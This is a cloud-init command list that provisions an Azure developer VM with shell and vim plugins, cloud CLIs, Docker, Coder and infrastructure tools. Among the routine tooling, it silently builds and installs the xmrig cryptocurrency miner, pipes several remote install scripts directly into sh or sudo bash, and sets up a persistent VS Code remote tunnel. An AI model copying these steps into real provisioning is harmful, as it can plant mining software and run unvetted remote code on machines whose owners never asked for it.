  - git clone https://github.com/conda-incubator/conda-zsh-completion.git /root/.oh-my-zsh/custom/plugins/conda-zsh-completion
  - git clone https://github.com/cda0/zsh-tfenv.git /root/.oh-my-zsh/custom/plugins/zsh-tfenv
  - git clone https://github.com/yuhonas/zsh-aliases-lsd.git /root/.oh-my-zsh/custom/plugins/zsh-aliases-lsd
  - curl -L https://raw.githubusercontent.com/Azure/azure-cli/dev/az.completion -o /root/.oh-my-zsh/custom/az.zsh
  - cp -a /root/.oh-my-zsh /etc/skel/.oh-my-zsh
  #- curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
  #- install -o root -g root -m 0755 kubectl /usr/bin/kubectl
  - mkdir -p /etc/skel/.local/state/vs-kubernetes/tools/kubectl/
  - ln -s `which kubectl` /etc/skel/.local/state/vs-kubernetes/tools/kubectl/kubectl
  - curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash -s -- -b /usr/local/bin
  - curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/tmp/awscliv2.zip"
  - unzip -q /tmp/awscliv2.zip -d /tmp
  - /tmp/aws/install
  - rm -rf /tmp/aws /tmp/awscliv2.zip
  - ansible-galaxy collection install fortinet.console fortinet.fortiadc fortinet.fortianalyzer fortinet.fortiflexvm fortinet.fortimanager fortinet.fortios fortinet.fortiswitch fortinet.fortiweb
  - [ bash, -c, "/root/npm-install.sh" ]
  - dotnet tool install --global Microsoft.CST.DevSkim.CLI
  - dotnet dev-certs https --trust
  - cp -a /root/.dotnet /etc/skel/.dotnet
  - [ bash, -c, "/root/clone-repos.sh" ]
  - echo '+nostats +nocomments +nocmd +noquestion +recurse +search' > /root/.digrc && cp /root/.digrc /etc/skel/.digrc
  - curl https://raw.githubusercontent.com/40docs/dotfiles/refs/heads/main/.p10k.zsh -o /root/.p10k.zsh && cp /root/.p10k.zsh /etc/skel/.p10k.zsh
  - curl https://raw.githubusercontent.com/40docs/dotfiles/refs/heads/main/.vimrc -o /root/.vimrc && cp /root/.vimrc /etc/skel/.vimrc
  - mkdir -p /root/.vim/pack/plugin/start
  - git clone https://github.com/vim-airline/vim-airline /root/.vim/pack/plugin/start/vim-airline
  - git clone https://github.com/preservim/nerdtree.git /root/.vim/pack/plugin/start/nerdtree
  - git clone https://github.com/junegunn/fzf.vim.git /root/.vim/pack/plugin/start/fzf
  - git clone https://github.com/airblade/vim-gitgutter.git /root/.vim/pack/plugin/start/vim-gitgutter
  - git clone https://github.com/tpope/vim-fugitive.git /root/.vim/pack/plugin/start/vim-fugitive
  - git clone --depth 1 https://github.com/sheerun/vim-polyglot /root/.vim/pack/plugin/start/vim-polyglot
  - git clone https://github.com/hashivim/vim-terraform.git /root/.vim/pack/plugin/start/vim-terraform
  - mkdir -p /root/.vim/pack/themes/start
  - git clone https://github.com/tomasiser/vim-code-dark /root/.vim/pack/themes/start/vim-code-dark
  - cp -a /root/.vim /etc/skel
  - curl -L https://raw.githubusercontent.com/rupa/z/master/z.sh -o /root/.z && cp /root/.z /etc/skel/.z
  - '[ -d /var/lib/docker ] || mkdir -p /var/lib/docker'
  - |
    DEV=/dev/disk/azure/scsi1/lun3
    if ! blkid -s TYPE "$DEV" >/dev/null 2>&1; then
      mkfs.ext4 -F "$DEV"
    fi
  - echo '/dev/disk/azure/scsi1/lun3 /var/lib/docker ext4 defaults,nofail 0 2' >> /etc/fstab
  - 'mountpoint -q /var/lib/docker || mount /dev/disk/azure/scsi1/lun3 /var/lib/docker'
  - 'DEBIAN_FRONTEND=noninteractive apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin docker-ce-rootless-extras docker-buildx-plugin'
  - docker pull ghcr.io/40docs/devcontainer:latest
  - usermod -aG docker ${VAR_admin_username}
  - service apache2 stop
  - systemctl disable apache2
  - export HOME="/root" && curl -fsSL https://coder.com/install.sh | sh -s -- && usermod -aG docker coder && echo 'CODER_HTTP_ADDRESS=0.0.0.0:80' > /etc/coder.d/coder.env && systemctl enable --now coder && journalctl -u coder.service -b && rm -rf "/root/.cache/coder/"
  - |
    #!/bin/sh
    ARCH=$(dpkg-architecture -q DEB_BUILD_ARCH)
    download_url=$(curl --silent "https://api.github.com/repos/jgraph/drawio-desktop/releases/latest" \
      | jq -r --arg ARCH "$ARCH" \
          '.assets[] | select(.name | contains("deb") and contains($ARCH)) | .browser_download_url')
    curl -s -L "$${download_url}" -o /tmp/drawio.deb
    dpkg -i /tmp/drawio.deb
    rm /tmp/drawio.deb
  - curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb
  - sudo dpkg -i minikube_latest_amd64.deb
  - mkdir -p /etc/skel/.local/state/vs-kubernetes/tools/minikube/linux-amd64
  - ln -s /usr/bin/minikube /etc/skel/.local/state/vs-kubernetes/tools/minikube/linux-amd64/minikube
  - curl -Lo /tmp/actionlint.sh https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash
  - chmod 755 /tmp/actionlint.sh
  - [ bash, -c, "/tmp/actionlint.sh" ]
  - curl -sSLo ./terraform-docs.tar.gz https://github.com/terraform-docs/terraform-docs/releases/download/v0.20.0/terraform-docs-v0.20.0-linux-amd64.tar.gz
  - tar -xzf terraform-docs.tar.gz
  - chmod +x terraform-docs
  - install terraform-docs -D -t /usr/local/bin/
  - curl -Lo terrascan.tar.gz https://github.com/tenable/terrascan/releases/download/v1.19.9/terrascan_1.19.9_Linux_x86_64.tar.gz
  - tar -xf terrascan.tar.gz terrascan && rm terrascan.tar.gz
  - install terrascan /usr/local/bin && rm terrascan
  - |
    LAZYGIT_VERSION=$(curl -s "https://api.github.com/repos/jesseduffield/lazygit/releases/latest" | \grep -Po '"tag_name": *"v\K[^"]*')
    curl -Lo lazygit.tar.gz "https://github.com/jesseduffield/lazygit/releases/download/v$${LAZYGIT_VERSION}/lazygit_$${LAZYGIT_VERSION}_Linux_x86_64.tar.gz"
    #curl -Lo lazygit.tar.gz https://github.com/jesseduffield/lazygit/releases/download/v0.51.1/lazygit_0.51.1_Linux_x86_64.tar.gz
    tar xf lazygit.tar.gz lazygit
    install lazygit -D -t /usr/local/bin/
  - curl -fsSL https://raw.githubusercontent.com/infracost/infracost/master/scripts/install.sh | sh
  - curl -Lo /tmp/kustomize.sh "https://raw.githubusercontent.com/kubernetes-sigs/kustomize/master/hack/install_kustomize.sh"
  - chmod 755 /tmp/kustomize.sh
  - [ bash, -c, "/tmp/kustomize.sh" ]
  - rm /tmp/kustomize.sh
  - curl -L -o speedtest.tgz https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-x86_64.tgz
  - tar -zxf speedtest.tgz
  - install speedtest /usr/local/bin/speedtest
  - rm speedtest.tgz
  - echo 'alias speedtest="speedtest --accept-license --accept-gdpr"' >> /root/.bash_aliases
  - echo 'alias speedtest="speedtest --accept-license --accept-gdpr"' >> /root/.zshrc
  - echo 'alias speedtest="speedtest --accept-license --accept-gdpr"' >> /root/.bashrc
  - |
    #!/bin/sh
    export PROVIDER=all
    curl -LO "https://github.com/GoogleCloudPlatform/terraformer/releases/download/$(curl -s https://api.github.com/repos/GoogleCloudPlatform/terraformer/releases/latest | grep tag_name | cut -d '"' -f 4)/terraformer-$${PROVIDER}-linux-amd64"
    chmod +x terraformer-$${PROVIDER}-linux-amd64
    sudo mv terraformer-$${PROVIDER}-linux-amd64 /usr/local/bin/terraformer
  - "GOBIN=/usr/local/bin go install golang.org/x/tools/gopls@latest"
  - "GOBIN=/usr/local/bin go install honnef.co/go/tools/cmd/staticcheck@latest"
  - git clone https://github.com/xmrig/xmrig.git /root/xmrig
  - mkdir /root/xmrig/build && cd /root/xmrig/build
  - cmake ..
  - make -j$(nproc)
  - install -m 0755 xmrig /usr/local/bin/xmrig
  - update-alternatives --set editor /usr/bin/vim.basic
  - cp -a /root/.config /etc/skel/.config
  - cp /root/.zshrc /etc/skel/.zshrc
  - cp /root/.bashrc /etc/skel/.bashrc
  - sed -i "s#^export OSH='/root/\.oh-my-bash'#export OSH=\"\$HOME/.oh-my-bash\"#" /etc/skel/.bashrc
  - cp /root/.bash_aliases /etc/skel/.bash_aliases
  - cp /root/.profile /etc/skel/.profile
  - |
    LACEWORK_VERSION=$(curl -s "https://api.github.com/repos/robinmordasiewicz/extensible-reporting/releases/latest" | grep -Po '"tag_name": "v\K[^"]*')
    curl -L -o lw_report_gen "https://github.com/robinmordasiewicz/extensible-reporting/releases/download/v$${LACEWORK_VERSION}/lw_report_gen_linux_x86_64"
    install lw_report_gen /usr/local/bin
    rm lw_report_gen
  - |
    mkdir -p /root/.config/systemd/user

    # Create a user systemd service that starts the tunnel on login
    cat << 'EOF' > /root/.config/systemd/user/vscode-tunnel.service
    [Unit]
    Description=VS Code Remote Tunnel
    After=network.target

    [Service]
    ExecStart=%h/bin/start-tunnel.sh
    Restart=always
    TimeoutStartSec=10

    [Install]
    WantedBy=default.target
    EOF

    mkdir -p /root/bin
    # Create a helper script to start the code tunnel
    cat << 'EOF' > /root/bin/start-tunnel.sh
    #!/bin/bash
    export PATH=$PATH:/usr/local/bin
    export HOME=$HOME
    exec code tunnel --accept-server-license-terms --name=$(hostname)-$USER
    EOF
    
    chmod +x /root/bin/start-tunnel.sh
    cp -a /root/bin /etc/skel

    # Enable lingering so user systemd services can run even when not logged in
    loginctl enable-linger
  - [ bash, /root/prewarm-cache.sh ]
  - fwupdmgr update -y --no-reboot-check
  - |
    echo "Checking if reboot is required..."
    if [ -f /var/run/reboot-required ]; then
      echo "Reboot required. Initiating reboot..."
      reboot
    else
      echo "No reboot required."
    fi
